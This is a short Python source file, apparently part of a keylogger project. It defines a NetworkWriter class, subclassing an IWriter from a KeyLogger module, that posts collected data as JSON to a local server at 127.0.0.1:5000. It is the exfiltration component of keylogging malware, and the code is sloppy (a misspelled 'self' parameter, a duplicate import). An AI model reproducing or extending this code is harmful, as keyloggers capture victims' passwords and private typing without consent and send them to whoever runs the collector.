from KeyLogger import IWriter
import requests

class  NetworkWriter(IWriter):
    def __init__(self):
        import requests
        super().__init__()
    def send_data(sel,data):
            
            url = 'http://127.0.0.1:5000/'
            response = requests.post(url, json=data)

